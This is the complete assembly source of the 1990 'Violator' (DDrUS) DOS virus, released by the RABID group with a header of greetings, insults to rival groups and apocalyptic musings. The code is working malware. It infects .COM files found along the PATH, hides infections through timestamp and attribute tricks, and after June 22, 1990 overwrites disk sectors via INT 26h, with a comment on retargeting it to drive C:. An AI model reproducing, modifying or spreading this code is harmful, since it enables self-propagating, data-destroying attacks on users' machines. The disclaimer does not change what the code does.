;******************************************************************************
;			   Violator Strain A Source Code
;******************************************************************************
;
; (May/1/1991)
;
; Well, in memory of the first anniversary of writing Violator, I have decided
; to release it's source code publicly. 
;
; This is the source code to the ORIGINAL Violator or DDrUS virus. It was set
; to go off on June 22nd, 1990. The significance of this date and the name
; Violator, was that my favourite group, Depeche Mode, were comming to Toronto
; to perform their "World Violator Tour" on that date. 
;
; This virus, as you can clearly see, is a base hack of the Vienna virus. The
; only thing I took out of the Vienna virus was the original scan string, and
; added date check routines as well as the INT 26 format routine. Other than
; that, this virus is pretty much like the original Vienna virus.
;
; In any event, have fun with this source code, but please keep in mind, that
; RABID does not condone the modification of this virus further in order to 
; create even more raging, destructive viruses. This source is being provided
; to you in order to see how easy it is to modify an existing virus into an
; instrument of destruction. Also, RABID accepts no responsibility for damage
; which may be wrought (material or immaterial, financial or personal, you get
; the idea...) through the spreading of this source code.
;
; At this point in time, I'd wish to express greetings to several people.
;
; To the Dark Avenger, for releasing "Eddie" source code. We have greatly 
; improved our programming prowess through analysis of your source code.
; (It wasn't that bad, despite all your self-scorning negative comments about
;  effectiveness of certain procedures)
; Keep up the great work...
; BTW: Hope you didn't mind RABID Avenger too much. We did spread the sucker
; some more...
;
; To YAM (Youth Against McAfee). Haha! Nice name. Too bad you can't program in
; anything other than PASCAL or QuickBASIC. 
;
; To John McAfee and Associates. Keep up the great work with your SCAN and
; CLEAN programs. But remember, if it wasn't for people like us, you wouldn't
; be where you are now... (BTW: How'dya like Violator B4? Did you get our 
; message, despite the bug in the ANSI routines? >SMOOCH< (hehe))
;
; To Mark Washburn. V2P6 is excellent. We love the source code... (Yes! We have
; it as well...) Keep up the great work, even if it is for research purposes.
;
; To Eric Omen (DSZ Author). Sorry about the Strain B4 bit. It wasn't our
; doing. You can blame L.o.L. for that...
;
; To L.o.L. Get real lives you pre-pubesent assholes. Your group sucks! What
; good comes by releasing a doc on 500 ways to crash Emulex, and claiming that
; you know the backdoors to it, and other BBS software. Yup. Just keep going to
; those Beverly Hills Snob Private schools and think you'll get somewhere in
; the world.
;
; To Slave Lord. Take your precious group and shove it up your ass sideways.
; Your cracks suck man! A friend of mine who attended COMDEX last year can
; sum up the majority of your group in one word. GEEKS! INC rules and it
; always will. Keep on dreaming... We eat assholes like you for breakfast...
; Need we even mention how many times we crashed Slave Den last year???
; 'Nuff said...
;
; To PCM2. Where the hell are you man? Get working guy...
;
; And to all other virus writers out there who remain annonomous. Keep up the
; great work. McFee wouldn't be where he is now unless it wansn't for people
; like us. (He should be greatfull...
;
; Take care guys... And watch out. We're everywhere...
;
;******************************************************************************
;
;		                    -=THE=-
;
;		    The RABID International Development Corp.
;  		    -----------------------------------------
; 		    Big hey-yo's to: FF, TJA, TM, PT, and MM.
;
;
; "...take heed that no man deceive you. For many shall come in my name,
; saying I am Christ; and shall deceive many. And ye shall hear of wars and
; rumours of wars: see that ye be not troubled: for all these things must come
; to pass, but the end is not yet. For nation shall rise against nation, and
; kingdom against kingdom: and there shall be famines, and pestilences, and
; earthquakes, in divers places. All these are the beginning of sorrows."
; (Matthew 24:4-9)
;
; The tenth day of Tishri shall fall upon October 9th, 2000. Revelation will
; be fulfilled.
;
; We're getting there unless those bastards in power do something to save this
; Earth we live on.  
; 
; Nostradamus prophesised that we may follow one of two paths. One to harmony,
; or one to destruction. Which path will we follow?
;
; Think about it.
;
;******************************************************************************



MOV_CX  MACRO   X
        DB      0B9H
        DW      X
ENDM

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

VCODE:  JMP     virus

	nop
	nop
	nop	
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	
v_start equ     $

virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat       ;This is where the virus data starts.
                                        ; The 2nd and 3rd bytes get modified.
        CLD                             ;Pointers will be auto INcremented
        MOV     SI,DX                   ;Access data as offset from SI
        ADD     SI,first_3              ;Point to original 1st 3 bytes of .COM
	MOV	CX,3
        MOV     DI,OFFSET 100H          ;`cause all .COM files start at 100H
        REPZ    MOVSB                   ;Restore original first 3 bytes of .COM
        MOV     SI,DX                   ;Keep SI pointing to the data area
	mov	ah,30h
	int	21h
	cmp	al,0
	JnZ	dos_ok
        JMP     quit                 

dos_ok: PUSH    ES
        MOV     AH,2FH
        INT     21H
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         ;Save the DTA address
        POP     ES
        MOV     DX,dta                  ;Offset of new DTA in virus data area
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Compute DTA address
        MOV     AH,1AH
        INT     21H                     ;Set new DTA to inside our own code
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    ;ES:DI points to environment
	JMP	year_check

year_check:
	mov	ah,2ah
	int	21h
	cmp	cx,1990
	jge	month_check
	jmp	find_path
	
month_check:
	mov	ah,2ah
	int	21h
	cmp	dh,6
	jge	day_check
	jmp	find_path

day_check:
	mov	ah,2ah
	int	21h			; Set date to June 22nd, 1990
	cmp	dl,22
	jge 	alter
	jmp	find_path

alter:
	mov	al,1			; Set for Drive 'B:'
	mov	cx,1      		; Change to 'MOV AL,2' for drive C:
	mov	dx,00
	mov	ds,[di+55]
	mov	bx,[di+99]
	int	26h
	jmp	find_path

      
find_path:
        POP     SI
        PUSH    SI                      ;Get SI back
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
        REPNZ   SCASB                   ;Search for first character
        MOV     CX,4

check_next_4:
        LODSB
        SCASB
        JNZ     find_path               ;If not all there, abort & start over
        LOOP    check_next_4            ;Loop to check the next character
        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI         ;Save the address of the PATH
        MOV     DI,SI
        ADD     DI,wrk_spc              ;File name workspace
        MOV     BX,SI                   ;Save a copy of SI
        ADD     SI,wrk_spc              ;Point SI to workspace
        MOV     DI,SI                   ;Point DI to workspace
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 ;Is PATH string ended?
        JNZ     found_subdir            ;If not, there are more subdirectories
        JMP     all_done                ;Else, we're all done


found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace


move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        NOP
        CMP     CH,'\'                  ;Ends with "\"?
        JZ      slash_ok                ;If yes
        MOV     AL,'\'                  ;Add one, if not
        STOSB


slash_ok:
        MOV     [BX+nam_ptr],DI         ;Set filename pointer to name workspace
        MOV     SI,BX                   ;Restore SI
        ADD     SI,f_spec               ;Point to "*.COM"
        MOV     CX,6
        REPZ    MOVSB                   ;Move "*.COM",0 to workspace
        MOV     SI,BX
        MOV     AH,4EH
        MOV     DX,wrk_spc
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;DX points to "*.COM" in workspace
        MOV     CX,3                    ;Attributes of Read Only or Hidden OK
        INT     21H
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH
        INT     21H

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1FH                  ;Mask to remove all but seconds
        CMP     AL,1FH                  ;62 seconds -> already infected
        JZ      find_next               ;If so, go find another file
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H
        MOV     [SI+old_att],CX         ;Save the old attributes
        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH        ;Set all except "read only" (weird)
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        MOV     AX,OFFSET 3D02H         ;Read/Write
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
        INT     21H
        AND     DH,7                    
        JMP     infect

infect:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
;       NOP                     ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area
        JB      fix_time_stamp  ;Quit, if read failed
        CMP     AX,3            ;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  ;Quit, if not
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp  ;Quit, if it didn't work
        MOV     CX,AX           ;DX:AX (long int) = file size
        SUB     AX,3            ;Subtract 3 (OK, since DX must be 0, here)
        MOV     [SI+jmp_dsp],AX ;Save the displacement in a JMP instruction
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           ;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
                                ;Point DI to reference vir_dat, at start of pgm
        MOV     [DI],CX         ;Modify vir_dat reference:2nd, 3rd bytes of pgm
        MOV     AH,40H
        MOV_CX  virlen                  ;Length of virus, in bytes
        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ; address of virus code in memory
        INT     21H
        JB      fix_time_stamp          ;Jump if error
        CMP     AX,OFFSET virlen        ;All bytes written?
        JNZ     fix_time_stamp          ;Jump if error
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp          ;Jump if error
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   ;Virus data area
        ADD     DX,jmp_op               ;Point to the reconstructed JMP
        INT     21H

fix_time_stamp:
        MOV     DX,[SI+ol_date]         ;Old file date
        MOV     CX,[SI+old_tim]         ;Old file time
        AND     CX,OFFSET 0FFE0H
        OR      CX,1FH                  ;Seconds = 31/30 min = 62 seconds
        MOV     AX,OFFSET 5701H
        INT     21H
        MOV     AH,3EH
        INT     21H

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         ;Old Attributes
        MOV     DX,wrk_spc
;       NOP                             ;MASM will add this NOP
        ADD     DX,SI                   ;DX points to \path\name in workspace
        INT     21H

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H
        POP     DS

quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH

vir_dat EQU     $

intro	db	13,10,' DDrUS (C) - 1990 $',13,10
olddta_ DW      0                       ;Old DTA offset
olddts_ DW      0                       ;Old DTA segment
oldtim_ DW      0                       ;Old Time
oldate_ DW      0                       ;Old date
oldatt_ DW      0                       ;Old file attributes
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H                    ;Start of JMP instruction
jmpdsp_ DW      0                       ;The displacement part
fspec_  DB      '*.COM',0
pathad_ DW      0                       ;Path address
namptr_ DW      0                       ;Pointer to start of file name
envstr_ DB      'PATH='                 ;Find this in the environment
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             ;Temporary DTA goes here
dtatim_ DW      0,0                     ;Time stamp in DTA
dtalen_ DW      0,0                     ;File length in the DTA
dtanam_ DB      0Dh dup (0)             ;File name in the DTA

lst_byt EQU     $                       ;All lines that assemble into code are
                                        ;  above this one

virlen  =       lst_byt - v_start       ;Length, in bytes, of the entire virus
codelen =       vir_dat - v_start       ;Length of virus code, only
c_len_x =       vir_dat - v_start - 2   ;Displacement for self-modifying code
c_len_y =       vir_dat - v_start + 100H ;Code length + 100h, for PSP
old_dta =       olddta_ - vir_dat       ;Displacement to the old DTA offset
old_dts =       olddts_ - vir_dat       ;Displacement to the old DTA segment
old_tim =       oldtim_ - vir_dat       ;Displacement to old file time stamp
ol_date =       oldate_ - vir_dat       ;Displacement to old file date stamp
old_att =       oldatt_ - vir_dat       ;Displacement to old attributes
first_3 =       first3_ - vir_dat       ;Displacement-1st 3 bytes of old .COM
jmp_op  =       jmpop_  - vir_dat       ;Displacement to the JMP opcode
jmp_dsp =       jmpdsp_ - vir_dat       ;Displacement to the 2nd 2 bytes of JMP
f_spec  =       fspec_  - vir_dat       ;Displacement to the "*.COM" string
path_ad =       pathad_ - vir_dat       ;Displacement to the path address
nam_ptr =       namptr_ - vir_dat       ;Displacement to the filename pointer
env_str =       envstr_ - vir_dat       ;Displacement to the "PATH=" string
wrk_spc =       wrkspc_ - vir_dat       ;Displacement to the filename workspace
dta     =       dta_    - vir_dat       ;Displacement to the temporary DTA
dta_tim =       dtatim_ - vir_dat       ;Displacement to the time in the DTA
dta_len =       dtalen_ - vir_dat       ;Displacement to the length in the DTA
dta_nam =       dtanam_ - vir_dat       ;Displacement to the name in the DTA

        CODE    ENDS
END     VCODE
